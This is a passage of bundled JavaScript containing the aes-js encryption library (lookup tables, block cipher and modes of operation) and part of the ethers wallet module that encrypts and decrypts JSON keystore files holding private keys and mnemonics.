533804130, 350174575, 164439672, 46346101, 870912086, 954669403, 636813900, 788204353, 2358957921, 2274680428, 2592523643, 2441661558, 2695033685, 2880240216, 3065962831, 3182487618, 3572145929, 3756299780, 3270937875, 3388507166, 4174560061, 4091327024, 4006521127, 3854606378, 1014646705, 930369212, 711349675, 560487590, 272786309, 457992840, 106852767, 223377554, 1678381017, 1862534868, 1914052035, 2031621326, 1211247597, 1128014560, 1580087799, 1428173050, 32283319, 182621114, 401639597, 486441376, 768917123, 651868046, 1003007129, 818324884, 1503449823, 1385356242, 1333838021, 1150208456, 1973745387, 2125135846, 1673061617, 1756818940, 2970356327, 3120694122, 2802849917, 2887651696, 2637442643, 2520393566, 2334669897, 2149987652, 3917234703, 3799141122, 4284502037, 4100872472, 3309594171, 3460984630, 3545789473, 3629546796, 2050466060, 1899603969, 1814803222, 1730525723, 1443857720, 1560382517, 1075025698, 1260232239, 575138148, 692707433, 878443390, 1062597235, 243256656, 91341917, 409198410, 325965383, 3403100636, 3252238545, 3704300486, 3620022987, 3874428392, 3990953189, 4042459122, 4227665663, 2460449204, 2578018489, 2226875310, 2411029155, 3198115200, 3046200461, 2827177882, 2743944855];
  var U3 = [0, 218828297, 437656594, 387781147, 875313188, 958871085, 775562294, 590424639, 1750626376, 1699970625, 1917742170, 2135253587, 1551124588, 1367295589, 1180849278, 1265195639, 3501252752, 3720081049, 3399941250, 3350065803, 3835484340, 3919042237, 4270507174, 4085369519, 3102249176, 3051593425, 2734591178, 2952102595, 2361698556, 2177869557, 2530391278, 2614737639, 3145456443, 3060847922, 2708326185, 2892417312, 2404901663, 2187128086, 2504130317, 2555048196, 3542330227, 3727205754, 3375740769, 3292445032, 3876557655, 3926170974, 4246310725, 4027744588, 1808481195, 1723872674, 1910319033, 2094410160, 1608975247, 1391201670, 1173430173, 1224348052, 59984867, 244860394, 428169201, 344873464, 935293895, 984907214, 766078933, 547512796, 1844882806, 1627235199, 2011214180, 2062270317, 1507497298, 1423022939, 1137477952, 1321699145, 95345982, 145085239, 532201772, 313773861, 830661914, 1015671571, 731183368, 648017665, 3175501286, 2957853679, 2807058932, 2858115069, 2305455554, 2220981195, 2474404304, 2658625497, 3575528878, 3625268135, 3473416636, 3254988725, 3778151818, 3963161475, 4213447064, 4130281361, 3599595085, 3683022916, 3432737375, 3247465558, 3802222185, 4020912224, 4172763771, 4122762354, 3201631749, 3017672716, 2764249623, 2848461854, 2331590177, 2280796200, 2431590963, 2648976442, 104699613, 188127444, 472615631, 287343814, 840019705, 1058709744, 671593195, 621591778, 1852171925, 1668212892, 1953757831, 2037970062, 1514790577, 1463996600, 1080017571, 1297403050, 3673637356, 3623636965, 3235995134, 3454686199, 4007360968, 3822090177, 4107101658, 4190530515, 2997825956, 3215212461, 2830708150, 2779915199, 2256734592, 2340947849, 2627016082, 2443058075, 172466556, 122466165, 273792366, 492483431, 1047239e3, 861968209, 612205898, 695634755, 1646252340, 1863638845, 2013908262, 1963115311, 1446242576, 1530455833, 1277555970, 1093597963, 1636604631, 1820824798, 2073724613, 1989249228, 1436590835, 1487645946, 1337376481, 1119727848, 164948639, 81781910, 331544205, 516552836, 1039717051, 821288114, 669961897, 719700128, 2973530695, 3157750862, 2871682645, 2787207260, 2232435299, 2283490410, 2667994737, 2450346104, 3647212047, 3564045318, 3279033885, 3464042516, 3980931627, 3762502690, 4150144569, 4199882800, 3070356634, 3121275539, 2904027272, 2686254721, 2200818878, 2384911031, 2570832044, 2486224549, 3747192018, 3528626907, 3310321856, 3359936201, 3950355702, 3867060991, 4049844452, 4234721005, 1739656202, 1790575107, 2108100632, 1890328081, 1402811438, 1586903591, 1233856572, 1149249077, 266959938, 48394827, 369057872, 418672217, 1002783846, 919489135, 567498868, 752375421, 209336225, 24197544, 376187827, 459744698, 945164165, 895287692, 574624663, 793451934, 1679968233, 1764313568, 2117360635, 1933530610, 1343127501, 1560637892, 1243112415, 1192455638, 3704280881, 3519142200, 3336358691, 3419915562, 3907448597, 3857572124, 4075877127, 4294704398, 3029510009, 3113855344, 2927934315, 2744104290, 2159976285, 2377486676, 2594734927, 2544078150];
  var U4 = [0, 151849742, 303699484, 454499602, 607398968, 758720310, 908999204, 1059270954, 1214797936, 1097159550, 1517440620, 1400849762, 1817998408, 1699839814, 2118541908, 2001430874, 2429595872, 2581445614, 2194319100, 2345119218, 3034881240, 3186202582, 2801699524, 2951971274, 3635996816, 3518358430, 3399679628, 3283088770, 4237083816, 4118925222, 4002861748, 3885750714, 1002142683, 850817237, 698445255, 548169417, 529487843, 377642221, 227885567, 77089521, 1943217067, 2061379749, 1640576439, 1757691577, 1474760595, 1592394909, 1174215055, 1290801793, 2875968315, 2724642869, 3111247143, 2960971305, 2405426947, 2253581325, 2638606623, 2487810577, 3808662347, 3926825029, 4044981591, 4162096729, 3342319475, 3459953789, 3576539503, 3693126241, 1986918061, 2137062819, 1685577905, 1836772287, 1381620373, 1532285339, 1078185097, 1229899655, 1040559837, 923313619, 740276417, 621982671, 439452389, 322734571, 137073913, 19308535, 3871163981, 4021308739, 4104605777, 4255800159, 3263785589, 3414450555, 3499326569, 3651041127, 2933202493, 2815956275, 3167684641, 3049390895, 2330014213, 2213296395, 2566595609, 2448830231, 1305906550, 1155237496, 1607244650, 1455525988, 1776460110, 1626319424, 2079897426, 1928707164, 96392454, 213114376, 396673818, 514443284, 562755902, 679998e3, 865136418, 983426092, 3708173718, 3557504664, 3474729866, 3323011204, 4180808110, 4030667424, 3945269170, 3794078908, 2507040230, 2623762152, 2272556026, 2390325492, 2975484382, 3092726480, 2738905026, 2857194700, 3973773121, 3856137295, 4274053469, 4157467219, 3371096953, 3252932727, 3673476453, 3556361835, 2763173681, 2915017791, 3064510765, 3215307299, 2156299017, 2307622919, 2459735317, 2610011675, 2081048481, 1963412655, 1846563261, 1729977011, 1480485785, 1362321559, 1243905413, 1126790795, 878845905, 1030690015, 645401037, 796197571, 274084841, 425408743, 38544885, 188821243, 3613494426, 3731654548, 3313212038, 3430322568, 4082475170, 4200115116, 3780097726, 3896688048, 2668221674, 2516901860, 2366882550, 2216610296, 3141400786, 2989552604, 2837966542, 2687165888, 1202797690, 1320957812, 1437280870, 1554391400, 1669664834, 1787304780, 1906247262, 2022837584, 265905162, 114585348, 499347990, 349075736, 736970802, 585122620, 972512814, 821712160, 2595684844, 2478443234, 2293045232, 2174754046, 3196267988, 3079546586, 2895723464, 2777952454, 3537852828, 3687994002, 3234156416, 3385345166, 4142626212, 4293295786, 3841024952, 3992742070, 174567692, 57326082, 410887952, 292596766, 777231668, 660510266, 1011452712, 893681702, 1108339068, 1258480242, 1343618912, 1494807662, 1715193156, 1865862730, 1948373848, 2100090966, 2701949495, 2818666809, 3004591147, 3122358053, 2235061775, 2352307457, 2535604243, 2653899549, 3915653703, 3764988233, 4219352155, 4067639125, 3444575871, 3294430577, 3746175075, 3594982253, 836553431, 953270745, 600235211, 718002117, 367585007, 484830689, 133361907, 251657213, 2041877159, 1891211689, 1806599355, 1654886325, 1568718495, 1418573201, 1335535747, 1184342925];
  function convertToInt32(bytes2) {
    const result = [];
    for (let i = 0; i < bytes2.length; i += 4) {
      result.push(bytes2[i] << 24 | bytes2[i + 1] << 16 | bytes2[i + 2] << 8 | bytes2[i + 3]);
    }
    return result;
  }
  var AES = class _AES {
    get key() {
      return __classPrivateFieldGet(this, _AES_key, "f").slice();
    }
    constructor(key) {
      _AES_key.set(this, void 0);
      _AES_Kd.set(this, void 0);
      _AES_Ke.set(this, void 0);
      if (!(this instanceof _AES)) {
        throw Error("AES must be instanitated with `new`");
      }
      __classPrivateFieldSet(this, _AES_key, new Uint8Array(key), "f");
      const rounds = numberOfRounds[this.key.length];
      if (rounds == null) {
        throw new TypeError("invalid key size (must be 16, 24 or 32 bytes)");
      }
      __classPrivateFieldSet(this, _AES_Ke, [], "f");
      __classPrivateFieldSet(this, _AES_Kd, [], "f");
      for (let i = 0; i <= rounds; i++) {
        __classPrivateFieldGet(this, _AES_Ke, "f").push([0, 0, 0, 0]);
        __classPrivateFieldGet(this, _AES_Kd, "f").push([0, 0, 0, 0]);
      }
      const roundKeyCount = (rounds + 1) * 4;
      const KC = this.key.length / 4;
      const tk = convertToInt32(this.key);
      let index;
      for (let i = 0; i < KC; i++) {
        index = i >> 2;
        __classPrivateFieldGet(this, _AES_Ke, "f")[index][i % 4] = tk[i];
        __classPrivateFieldGet(this, _AES_Kd, "f")[rounds - index][i % 4] = tk[i];
      }
      let rconpointer = 0;
      let t = KC, tt;
      while (t < roundKeyCount) {
        tt = tk[KC - 1];
        tk[0] ^= S[tt >> 16 & 255] << 24 ^ S[tt >> 8 & 255] << 16 ^ S[tt & 255] << 8 ^ S[tt >> 24 & 255] ^ rcon[rconpointer] << 24;
        rconpointer += 1;
        if (KC != 8) {
          for (let i2 = 1; i2 < KC; i2++) {
            tk[i2] ^= tk[i2 - 1];
          }
        } else {
          for (let i2 = 1; i2 < KC / 2; i2++) {
            tk[i2] ^= tk[i2 - 1];
          }
          tt = tk[KC / 2 - 1];
          tk[KC / 2] ^= S[tt & 255] ^ S[tt >> 8 & 255] << 8 ^ S[tt >> 16 & 255] << 16 ^ S[tt >> 24 & 255] << 24;
          for (let i2 = KC / 2 + 1; i2 < KC; i2++) {
            tk[i2] ^= tk[i2 - 1];
          }
        }
        let i = 0, r, c;
        while (i < KC && t < roundKeyCount) {
          r = t >> 2;
          c = t % 4;
          __classPrivateFieldGet(this, _AES_Ke, "f")[r][c] = tk[i];
          __classPrivateFieldGet(this, _AES_Kd, "f")[rounds - r][c] = tk[i++];
          t++;
        }
      }
      for (let r = 1; r < rounds; r++) {
        for (let c = 0; c < 4; c++) {
          tt = __classPrivateFieldGet(this, _AES_Kd, "f")[r][c];
          __classPrivateFieldGet(this, _AES_Kd, "f")[r][c] = U1[tt >> 24 & 255] ^ U2[tt >> 16 & 255] ^ U3[tt >> 8 & 255] ^ U4[tt & 255];
        }
      }
    }
    encrypt(plaintext) {
      if (plaintext.length != 16) {
        throw new TypeError("invalid plaintext size (must be 16 bytes)");
      }
      const rounds = __classPrivateFieldGet(this, _AES_Ke, "f").length - 1;
      const a = [0, 0, 0, 0];
      let t = convertToInt32(plaintext);
      for (let i = 0; i < 4; i++) {
        t[i] ^= __classPrivateFieldGet(this, _AES_Ke, "f")[0][i];
      }
      for (let r = 1; r < rounds; r++) {
        for (let i = 0; i < 4; i++) {
          a[i] = T1[t[i] >> 24 & 255] ^ T2[t[(i + 1) % 4] >> 16 & 255] ^ T3[t[(i + 2) % 4] >> 8 & 255] ^ T4[t[(i + 3) % 4] & 255] ^ __classPrivateFieldGet(this, _AES_Ke, "f")[r][i];
        }
        t = a.slice();
      }
      const result = new Uint8Array(16);
      let tt = 0;
      for (let i = 0; i < 4; i++) {
        tt = __classPrivateFieldGet(this, _AES_Ke, "f")[rounds][i];
        result[4 * i] = (S[t[i] >> 24 & 255] ^ tt >> 24) & 255;
        result[4 * i + 1] = (S[t[(i + 1) % 4] >> 16 & 255] ^ tt >> 16) & 255;
        result[4 * i + 2] = (S[t[(i + 2) % 4] >> 8 & 255] ^ tt >> 8) & 255;
        result[4 * i + 3] = (S[t[(i + 3) % 4] & 255] ^ tt) & 255;
      }
      return result;
    }
    decrypt(ciphertext) {
      if (ciphertext.length != 16) {
        throw new TypeError("invalid ciphertext size (must be 16 bytes)");
      }
      const rounds = __classPrivateFieldGet(this, _AES_Kd, "f").length - 1;
      const a = [0, 0, 0, 0];
      let t = convertToInt32(ciphertext);
      for (let i = 0; i < 4; i++) {
        t[i] ^= __classPrivateFieldGet(this, _AES_Kd, "f")[0][i];
      }
      for (let r = 1; r < rounds; r++) {
        for (let i = 0; i < 4; i++) {
          a[i] = T5[t[i] >> 24 & 255] ^ T6[t[(i + 3) % 4] >> 16 & 255] ^ T7[t[(i + 2) % 4] >> 8 & 255] ^ T8[t[(i + 1) % 4] & 255] ^ __classPrivateFieldGet(this, _AES_Kd, "f")[r][i];
        }
        t = a.slice();
      }
      const result = new Uint8Array(16);
      let tt = 0;
      for (let i = 0; i < 4; i++) {
        tt = __classPrivateFieldGet(this, _AES_Kd, "f")[rounds][i];
        result[4 * i] = (Si[t[i] >> 24 & 255] ^ tt >> 24) & 255;
        result[4 * i + 1] = (Si[t[(i + 3) % 4] >> 16 & 255] ^ tt >> 16) & 255;
        result[4 * i + 2] = (Si[t[(i + 2) % 4] >> 8 & 255] ^ tt >> 8) & 255;
        result[4 * i + 3] = (Si[t[(i + 1) % 4] & 255] ^ tt) & 255;
      }
      return result;
    }
  };
  _AES_key = /* @__PURE__ */ new WeakMap(), _AES_Kd = /* @__PURE__ */ new WeakMap(), _AES_Ke = /* @__PURE__ */ new WeakMap();

  // node_modules/aes-js/lib.esm/mode.js
  var ModeOfOperation = class {
    constructor(name, key, cls) {
      if (cls && !(this instanceof cls)) {
        throw new Error(`${name} must be instantiated with "new"`);
      }
      Object.defineProperties(this, {
        aes: { enumerable: true, value: new AES(key) },
        name: { enumerable: true, value: name }
      });
    }
  };

  // node_modules/aes-js/lib.esm/mode-cbc.js
  var __classPrivateFieldSet2 = function(receiver, state, value, kind, f2) {
    if (kind === "m") throw new TypeError("Private method is not writable");
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a setter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return kind === "a" ? f2.call(receiver, value) : f2 ? f2.value = value : state.set(receiver, value), value;
  };
  var __classPrivateFieldGet2 = function(receiver, state, kind, f2) {
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a getter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return kind === "m" ? f2 : kind === "a" ? f2.call(receiver) : f2 ? f2.value : state.get(receiver);
  };
  var _CBC_iv;
  var _CBC_lastBlock;
  var CBC = class _CBC extends ModeOfOperation {
    constructor(key, iv) {
      super("ECC", key, _CBC);
      _CBC_iv.set(this, void 0);
      _CBC_lastBlock.set(this, void 0);
      if (iv) {
        if (iv.length % 16) {
          throw new TypeError("invalid iv size (must be 16 bytes)");
        }
        __classPrivateFieldSet2(this, _CBC_iv, new Uint8Array(iv), "f");
      } else {
        __classPrivateFieldSet2(this, _CBC_iv, new Uint8Array(16), "f");
      }
      __classPrivateFieldSet2(this, _CBC_lastBlock, this.iv, "f");
    }
    get iv() {
      return new Uint8Array(__classPrivateFieldGet2(this, _CBC_iv, "f"));
    }
    encrypt(plaintext) {
      if (plaintext.length % 16) {
        throw new TypeError("invalid plaintext size (must be multiple of 16 bytes)");
      }
      const ciphertext = new Uint8Array(plaintext.length);
      for (let i = 0; i < plaintext.length; i += 16) {
        for (let j = 0; j < 16; j++) {
          __classPrivateFieldGet2(this, _CBC_lastBlock, "f")[j] ^= plaintext[i + j];
        }
        __classPrivateFieldSet2(this, _CBC_lastBlock, this.aes.encrypt(__classPrivateFieldGet2(this, _CBC_lastBlock, "f")), "f");
        ciphertext.set(__classPrivateFieldGet2(this, _CBC_lastBlock, "f"), i);
      }
      return ciphertext;
    }
    decrypt(ciphertext) {
      if (ciphertext.length % 16) {
        throw new TypeError("invalid ciphertext size (must be multiple of 16 bytes)");
      }
      const plaintext = new Uint8Array(ciphertext.length);
      for (let i = 0; i < ciphertext.length; i += 16) {
        const block = this.aes.decrypt(ciphertext.subarray(i, i + 16));
        for (let j = 0; j < 16; j++) {
          plaintext[i + j] = block[j] ^ __classPrivateFieldGet2(this, _CBC_lastBlock, "f")[j];
          __classPrivateFieldGet2(this, _CBC_lastBlock, "f")[j] = ciphertext[i + j];
        }
      }
      return plaintext;
    }
  };
  _CBC_iv = /* @__PURE__ */ new WeakMap(), _CBC_lastBlock = /* @__PURE__ */ new WeakMap();

  // node_modules/aes-js/lib.esm/mode-cfb.js
  var __classPrivateFieldGet3 = function(receiver, state, kind, f2) {
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a getter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return kind === "m" ? f2 : kind === "a" ? f2.call(receiver) : f2 ? f2.value : state.get(receiver);
  };
  var _CFB_instances;
  var _CFB_iv;
  var _CFB_shiftRegister;
  var _CFB_shift;
  _CFB_iv = /* @__PURE__ */ new WeakMap(), _CFB_shiftRegister = /* @__PURE__ */ new WeakMap(), _CFB_instances = /* @__PURE__ */ new WeakSet(), _CFB_shift = function _CFB_shift2(data) {
    const segmentSize = this.segmentSize / 8;
    __classPrivateFieldGet3(this, _CFB_shiftRegister, "f").set(__classPrivateFieldGet3(this, _CFB_shiftRegister, "f").subarray(segmentSize));
    __classPrivateFieldGet3(this, _CFB_shiftRegister, "f").set(data.subarray(0, segmentSize), 16 - segmentSize);
  };

  // node_modules/aes-js/lib.esm/mode-ctr.js
  var __classPrivateFieldSet3 = function(receiver, state, value, kind, f2) {
    if (kind === "m") throw new TypeError("Private method is not writable");
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a setter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return kind === "a" ? f2.call(receiver, value) : f2 ? f2.value = value : state.set(receiver, value), value;
  };
  var __classPrivateFieldGet4 = function(receiver, state, kind, f2) {
    if (kind === "a" && !f2) throw new TypeError("Private accessor was defined without a getter");
    if (typeof state === "function" ? receiver !== state || !f2 : !state.has(receiver)) throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return kind === "m" ? f2 : kind === "a" ? f2.call(receiver) : f2 ? f2.value : state.get(receiver);
  };
  var _CTR_remaining;
  var _CTR_remainingIndex;
  var _CTR_counter;
  var CTR = class _CTR extends ModeOfOperation {
    constructor(key, initialValue) {
      super("CTR", key, _CTR);
      _CTR_remaining.set(this, void 0);
      _CTR_remainingIndex.set(this, void 0);
      _CTR_counter.set(this, void 0);
      __classPrivateFieldSet3(this, _CTR_counter, new Uint8Array(16), "f");
      __classPrivateFieldGet4(this, _CTR_counter, "f").fill(0);
      __classPrivateFieldSet3(this, _CTR_remaining, __classPrivateFieldGet4(this, _CTR_counter, "f"), "f");
      __classPrivateFieldSet3(this, _CTR_remainingIndex, 16, "f");
      if (initialValue == null) {
        initialValue = 1;
      }
      if (typeof initialValue === "number") {
        this.setCounterValue(initialValue);
      } else {
        this.setCounterBytes(initialValue);
      }
    }
    get counter() {
      return new Uint8Array(__classPrivateFieldGet4(this, _CTR_counter, "f"));
    }
    setCounterValue(value) {
      if (!Number.isInteger(value) || value < 0 || value > Number.MAX_SAFE_INTEGER) {
        throw new TypeError("invalid counter initial integer value");
      }
      for (let index = 15; index >= 0; --index) {
        __classPrivateFieldGet4(this, _CTR_counter, "f")[index] = value % 256;
        value = Math.floor(value / 256);
      }
    }
    setCounterBytes(value) {
      if (value.length !== 16) {
        throw new TypeError("invalid counter initial Uint8Array value length");
      }
      __classPrivateFieldGet4(this, _CTR_counter, "f").set(value);
    }
    increment() {
      for (let i = 15; i >= 0; i--) {
        if (__classPrivateFieldGet4(this, _CTR_counter, "f")[i] === 255) {
          __classPrivateFieldGet4(this, _CTR_counter, "f")[i] = 0;
        } else {
          __classPrivateFieldGet4(this, _CTR_counter, "f")[i]++;
          break;
        }
      }
    }
    encrypt(plaintext) {
      var _a, _b;
      const crypttext = new Uint8Array(plaintext);
      for (let i = 0; i < crypttext.length; i++) {
        if (__classPrivateFieldGet4(this, _CTR_remainingIndex, "f") === 16) {
          __classPrivateFieldSet3(this, _CTR_remaining, this.aes.encrypt(__classPrivateFieldGet4(this, _CTR_counter, "f")), "f");
          __classPrivateFieldSet3(this, _CTR_remainingIndex, 0, "f");
          this.increment();
        }
        crypttext[i] ^= __classPrivateFieldGet4(this, _CTR_remaining, "f")[__classPrivateFieldSet3(this, _CTR_remainingIndex, (_b = __classPrivateFieldGet4(this, _CTR_remainingIndex, "f"), _a = _b++, _b), "f"), _a];
      }
      return crypttext;
    }
    decrypt(ciphertext) {
      return this.encrypt(ciphertext);
    }
  };
  _CTR_remaining = /* @__PURE__ */ new WeakMap(), _CTR_remainingIndex = /* @__PURE__ */ new WeakMap(), _CTR_counter = /* @__PURE__ */ new WeakMap();

  // node_modules/aes-js/lib.esm/mode-ofb.js
  var _OFB_iv;
  var _OFB_lastPrecipher;
  var _OFB_lastPrecipherIndex;
  _OFB_iv = /* @__PURE__ */ new WeakMap(), _OFB_lastPrecipher = /* @__PURE__ */ new WeakMap(), _OFB_lastPrecipherIndex = /* @__PURE__ */ new WeakMap();

  // node_modules/aes-js/lib.esm/padding.js
  function pkcs7Strip(data) {
    if (data.length < 16) {
      throw new TypeError("PKCS#7 invalid length");
    }
    const padder = data[data.length - 1];
    if (padder > 16) {
      throw new TypeError("PKCS#7 padding byte out of range");
    }
    const length = data.length - padder;
    for (let i = 0; i < padder; i++) {
      if (data[length + i] !== padder) {
        throw new TypeError("PKCS#7 invalid padding byte");
      }
    }
    return new Uint8Array(data.subarray(0, length));
  }

  // node_modules/ethers/lib.esm/wallet/utils.js
  function looseArrayify(hexString) {
    if (typeof hexString === "string" && !hexString.startsWith("0x")) {
      hexString = "0x" + hexString;
    }
    return getBytesCopy(hexString);
  }
  function zpad(value, length) {
    value = String(value);
    while (value.length < length) {
      value = "0" + value;
    }
    return value;
  }
  function getPassword(password) {
    if (typeof password === "string") {
      return toUtf8Bytes(password, "NFKC");
    }
    return getBytesCopy(password);
  }
  function spelunk(object, _path) {
    const match = _path.match(/^([a-z0-9$_.-]*)(:([a-z]+))?(!)?$/i);
    assertArgument(match != null, "invalid path", "path", _path);
    const path = match[1];
    const type = match[3];
    const reqd = match[4] === "!";
    let cur = object;
    for (const comp of path.toLowerCase().split(".")) {
      if (Array.isArray(cur)) {
        if (!comp.match(/^[0-9]+$/)) {
          break;
        }
        cur = cur[parseInt(comp)];
      } else if (typeof cur === "object") {
        let found = null;
        for (const key in cur) {
          if (key.toLowerCase() === comp) {
            found = cur[key];
            break;
          }
        }
        cur = found;
      } else {
        cur = null;
      }
      if (cur == null) {
        break;
      }
    }
    assertArgument(!reqd || cur != null, "missing required value", "path", path);
    if (type && cur != null) {
      if (type === "int") {
        if (typeof cur === "string" && cur.match(/^-?[0-9]+$/)) {
          return parseInt(cur);
        } else if (Number.isSafeInteger(cur)) {
          return cur;
        }
      }
      if (type === "number") {
        if (typeof cur === "string" && cur.match(/^-?[0-9.]*$/)) {
          return parseFloat(cur);
        }
      }
      if (type === "data") {
        if (typeof cur === "string") {
          return looseArrayify(cur);
        }
      }
      if (type === "array" && Array.isArray(cur)) {
        return cur;
      }
      if (type === typeof cur) {
        return cur;
      }
      assertArgument(false, `wrong type found for ${type} `, "path", path);
    }
    return cur;
  }

  // node_modules/ethers/lib.esm/wallet/json-keystore.js
  var defaultPath = "m/44'/60'/0'/0/0";
  function isKeystoreJson(json) {
    try {
      const data = JSON.parse(json);
      const version2 = data.version != null ? parseInt(data.version) : 0;
      if (version2 === 3) {
        return true;
      }
    } catch (error) {
    }
    return false;
  }
  function decrypt(data, key, ciphertext) {
    const cipher = spelunk(data, "crypto.cipher:string");
    if (cipher === "aes-128-ctr") {
      const iv = spelunk(data, "crypto.cipherparams.iv:data!");
      const aesCtr = new CTR(key, iv);
      return hexlify(aesCtr.decrypt(ciphertext));
    }
    assert(false, "unsupported cipher", "UNSUPPORTED_OPERATION", {
      operation: "decrypt"
    });
  }
  function getAccount(data, _key) {
    const key = getBytes(_key);
    const ciphertext = spelunk(data, "crypto.ciphertext:data!");
    const computedMAC = hexlify(keccak256(concat([key.slice(16, 32), ciphertext]))).substring(2);
    assertArgument(computedMAC === spelunk(data, "crypto.mac:string!").toLowerCase(), "incorrect password", "password", "[ REDACTED ]");
    const privateKey = decrypt(data, key.slice(0, 16), ciphertext);
    const address = computeAddress(privateKey);
    if (data.address) {
      let check = data.address.toLowerCase();
      if (!check.startsWith("0x")) {
        check = "0x" + check;
      }
      assertArgument(getAddress(check) === address, "keystore address/privateKey mismatch", "address", data.address);
    }
    const account = { address, privateKey };
    const version2 = spelunk(data, "x-ethers.version:string");
    if (version2 === "0.1") {
      const mnemonicKey = key.slice(32, 64);
      const mnemonicCiphertext = spelunk(data, "x-ethers.mnemonicCiphertext:data!");
      const mnemonicIv = spelunk(data, "x-ethers.mnemonicCounter:data!");
      const mnemonicAesCtr = new CTR(mnemonicKey, mnemonicIv);
      account.mnemonic = {
        path: spelunk(data, "x-ethers.path:string") || defaultPath,
        locale: spelunk(data, "x-ethers.locale:string") || "en",
        entropy: hexlify(getBytes(mnemonicAesCtr.decrypt(mnemonicCiphertext)))
      };
    }
    return account;
  }
  function getDecryptKdfParams(data) {
    const kdf = spelunk(data, "crypto.kdf:string");
    if (kdf && typeof kdf === "string") {
      if (kdf.toLowerCase() === "scrypt") {
        const salt = spelunk(data, "crypto.kdfparams.salt:data!");
        const N2 = spelunk(data, "crypto.kdfparams.n:int!");
        const r = spelunk(data, "crypto.kdfparams.r:int!");
        const p = spelunk(data, "crypto.kdfparams.p:int!");
        assertArgument(N2 > 0 && (N2 & N2 - 1) === 0, "invalid kdf.N", "kdf.N", N2);
        assertArgument(r > 0 && p > 0, "invalid kdf", "kdf", kdf);
        const dkLen = spelunk(data, "crypto.kdfparams.dklen:int!");
        assertArgument(dkLen === 32, "invalid kdf.dklen", "kdf.dflen", dkLen);
        return { name: "scrypt", salt, N: N2, r, p, dkLen: 64 };
      } else if (kdf.toLowerCase() === "pbkdf2") {
        const salt = spelunk(data, "crypto.kdfparams.salt:data!");
        const prf = spelunk(data, "crypto.kdfparams.prf:string!");
        const algorithm = prf.split("-").pop();
        assertArgument(algorithm === "sha256" || algorithm === "sha512", "invalid kdf.pdf", "kdf.pdf", prf);
        const count = spelunk(data, "crypto.kdfparams.c:int!");
        const dkLen = spelunk(data, "crypto.kdfparams.dklen:int!");
        assertArgument(dkLen === 32, "invalid kdf.dklen", "kdf.dklen", dkLen);
        return { name: "pbkdf2", salt, count, dkLen, algorithm };
      }
    }
    assertArgument(false, "unsupported key-derivation function", "kdf", kdf);
  }
  function decryptKeystoreJsonSync(json, _password) {
    const data = JSON.parse(json);
    const password = getPassword(_password);
    const params = getDecryptKdfParams(data);
    if (params.name === "pbkdf2") {
      const { salt: salt2, count, dkLen: dkLen2, algorithm } = params;
      const key2 = pbkdf22(password, salt2, count, dkLen2, algorithm);
      return getAccount(data, key2);
    }
    assert(params.name === "scrypt", "cannot be reached", "UNKNOWN_ERROR", { params });
    const { salt, N: N2, r, p, dkLen } = params;
    const key = scryptSync(password, salt, N2, r, p, dkLen);
    return getAccount(data, key);
  }
  function stall(duration) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve();
      }, duration);
    });
  }
  async function decryptKeystoreJson(json, _password, progress) {
    const data = JSON.parse(json);
    const password = getPassword(_password);
    const params = getDecryptKdfParams(data);
    if (params.name === "pbkdf2") {
      if (progress) {
        progress(0);
        await stall(0);
      }
      const { salt: salt2, count, dkLen: dkLen2, algorithm } = params;
      const key2 = pbkdf22(password, salt2, count, dkLen2, algorithm);
      if (progress) {
        progress(1);
        await stall(0);
      }
      return getAccount(data, key2);
    }
    assert(params.name === "scrypt", "cannot be reached", "UNKNOWN_ERROR", { params });
    const { salt, N: N2, r, p, dkLen } = params;
    const key = await scrypt2(password, salt, N2, r, p, dkLen, progress);
    return getAccount(data, key);
  }
  function getEncryptKdfParams(options) {
    const salt = options.salt != null ? getBytes(options.salt, "options.salt") : randomBytes3(32);
    let N2 = 1 << 17, r = 8, p = 1;
    if (options.scrypt) {
      if (options.scrypt.N) {
        N2 = options.scrypt.N;
      }
      if (options.scrypt.r) {
        r = options.scrypt.r;
      }
      if (options.scrypt.p) {
        p = options.scrypt.p;
      }
    }
    assertArgument(typeof N2 === "number" && N2 > 0 && Number.isSafeInteger(N2) && (BigInt(N2) & BigInt(N2 - 1)) === BigInt(0), "invalid scrypt N parameter", "options.N", N2);
    assertArgument(typeof r === "number" && r > 0 && Number.isSafeInteger(r), "invalid scrypt r parameter", "options.r", r);
    assertArgument(typeof p === "number" && p > 0 && Number.isSafeInteger(p), "invalid scrypt p parameter", "options.p", p);
    return { name: "scrypt", dkLen: 32, salt, N: N2, r, p };
  }
  function _encryptKeystore(key, kdf, account, options) {
    const privateKey = getBytes(account.privateKey, "privateKey");
    const iv = options.iv != null ? getBytes(options.iv, "options.iv") : randomBytes3(16);
    assertArgument(iv.length === 16, "invalid options.iv length", "options.iv", options.iv);
    const uuidRandom = options.uuid != null ? getBytes(options.uuid, "options.uuid") : randomBytes3(16);
    assertArgument(uuidRandom.length === 16, "invalid options.uuid length", "options.uuid", options.iv);
    const derivedKey = key.slice(0, 16);
    const macPrefix = key.slice(16, 32);
    const aesCtr = new CTR(derivedKey, iv);
    const ciphertext = getBytes(aesCtr.encrypt(privateKey));
    const mac = keccak256(concat([macPrefix, ciphertext]));
    const data = {
      address: account.address.substring(2).toLowerCase(),
      id: uuidV4(uuidRandom),
      version: 3,
      Crypto: {
        cipher: "aes-128-ctr",
        cipherparams: {
          iv: hexlify(iv).substring(2)
        },
        ciphertext: hexlify(ciphertext).substring(2),
        kdf: "scrypt",
        kdfparams: {
          salt: hexlify(kdf.salt).substring(2),
          n: kdf.N,
          dklen: 32,
          p: kdf.p,
          r: kdf.r
        },
        mac: mac.substring(2)
      }
    };
    if (account.mnemonic) {
      const client = options.client != null ? options.client : `ethers/${version}`;
      const path = account.mnemonic.path || defaultPath;
      const locale = account.mnemonic.locale || "en";
      const mnemonicKey = key.slice(32, 64);
